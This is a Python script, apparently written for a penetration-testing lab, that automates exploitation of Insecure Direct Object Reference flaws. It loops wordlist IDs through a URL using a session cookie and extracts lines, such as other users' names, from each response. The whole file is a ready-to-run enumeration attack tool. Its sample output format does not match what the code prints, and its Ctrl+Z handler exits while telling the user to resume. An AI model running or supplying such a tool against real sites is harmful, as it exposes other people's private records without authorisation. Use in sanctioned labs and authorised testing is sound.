"""
This Python script automates the exploitation of Insecure Direct Object Reference (IDOR) vulnerabilities by fuzzing a parameter in a URL, using values from a wordlist, and extracting relevant information from server responses. It replaces the FUZZ keyword in the URL with values from the wordlist, sends authenticated requests using a session cookie, and searches the response for a specified string, printing the full matching line. This helps security analysts efficiently enumerate accessible objects like user profiles or documents.

Example syntax:
python3 idor.py -u http://careers.inlanefreight.local/profile?id=FUZZ -c "session=eyJsb2dnZWRfaW4iOnRydWV9.Z4svuQ.GN9x-sOHTfIR0dyg0pl9c-qcgIc" -w dict -s "applied by"

Example output:
[+] Match found for 1: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by James</h1>
[+] Match found for 2: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by Harry</h1>
[+] Match found for 3: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by Tom</h1>
[+] Match found for 4: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by htb-student</h1>
[+] Match found for 5: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by Jerry</h1>
[+] Match found for 6: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by James</h1>
[+] Match found for 7: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by John</h1>
[+] Match found for 8: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by Miller</h1>
[+] Match found for 9: <h1 class="text-center mb-5 wow fadeInUp" data-wow-delay="0.1s">Jobs applied by haxor</h1>

"""
import requests
import argparse
import time
import sys
import os
import signal

# Handle SIGTSTP (Ctrl+Z)
def handle_sigstp(signum, frame):
    print("\n[INFO] User paused execution. Use 'fg' to resume.")
    sys.exit(0)

# Attach the signal handler
signal.signal(signal.SIGTSTP, handle_sigstp)

def fuzz_idor(url, cookie, wordlist, search_string, stop_on_found=False, output_file=None, delay=0.5, verbose=False):
    """Performs IDOR fuzzing by replacing 'FUZZ' in the URL with values from a wordlist.
    Prints any line from the response that contains the search_string and optionally saves results to a file.
    Stops immediately when a match is found if 'stop_on_found' is True.
    """

    if "FUZZ" not in url:
        print("[ERROR] URL must contain 'FUZZ' placeholder.")
        sys.exit(1)

    if not os.path.isfile(wordlist):
        print(f"[ERROR] Wordlist file '{wordlist}' not found.")
        sys.exit(1)

    try:
        with open(wordlist, 'r', encoding='utf-8') as f:
            wordlist_values = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[ERROR] Failed to read wordlist: {e}")
        sys.exit(1)

    if not search_string:
        print("[ERROR] Search string cannot be empty.")
        sys.exit(1)

    headers = {"Cookie": cookie}
    session = requests.Session()

    if verbose:
        print(f"[INFO] Accessing wordlist: {wordlist}")
        print(f"[INFO] Total values to test: {len(wordlist_values)}")
        print("[INFO] Starting IDOR fuzzing...\n")

    # Open output file if specified
    if output_file:
        try:
            output = open(output_file, "a", encoding='utf-8')  # Open in append mode
        except Exception as e:
            print(f"[ERROR] Failed to open output file: {e}")
            sys.exit(1)

    try:
        for value in wordlist_values:
            target_url = url.replace("FUZZ", value)
            try:
                if verbose:
                    print(f"REQUEST: {target_url}")

                response = session.get(target_url, headers=headers, timeout=5)
                response_size = len(response.content)

                if verbose:
                    print(f"RESPONSE: {response.status_code} | Size: {response_size} bytes")

                if response.status_code == 401:
                    print("[ERROR] Unauthorized access! Check your session cookie.")
                    sys.exit(1)
                elif response.status_code == 403:
                    print("[ERROR] Forbidden! The request might be blocked.")
                    sys.exit(1)
                elif response.status_code == 404:
                    if verbose:
                        print(f"[WARNING] {target_url} returned 404 (Not Found).")
                    continue
                elif response.status_code >= 500:
                    print(f"[ERROR] Server error ({response.status_code}). Retrying...")
                    time.sleep(2)
                    continue

                for line in response.text.split("\n"):
                    if search_string in line:
                        result = f"[FOUND] {value}: {line.strip()}"
                        print(result)

                        # Save result to output file if specified
                        if output_file:
                            output.write(result + "\n")

                        if stop_on_found:
                            print("[INFO] Stopping fuzzing as result is found.")
                            if output_file:
                                output.close()
                            sys.exit(0)

            except requests.exceptions.Timeout:
                print(f"[ERROR] Timeout while connecting to {target_url}. Skipping...")
            except requests.exceptions.ConnectionError:
                print(f"[ERROR] Connection error! The server might be down.")
                sys.exit(1)
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Unexpected error: {e}")
                sys.exit(1)

            time.sleep(delay)

    except KeyboardInterrupt:
        print("\n[INFO] User aborted. Exiting...")
        sys.exit(0)

    # Close output file if opened
    if output_file:
        output.close()

    print("[INFO] IDOR fuzzing complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IDOR Fuzzing Script")
    parser.add_argument("-u", "--url", required=True, help="Target URL with 'FUZZ' placeholder")
    parser.add_argument("-c", "--cookie", required=True, help="Session cookie for authentication")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-s", "--search", required=True, help="String to search in response")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests (default: 0.5s)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-ss", "--stop-on-found", action="store_true", help="Stop fuzzing when a result is found")

    args = parser.parse_args()

    fuzz_idor(args.url, args.cookie, args.wordlist, args.search, args.stop_on_found, args.output, args.delay, args.verbose)
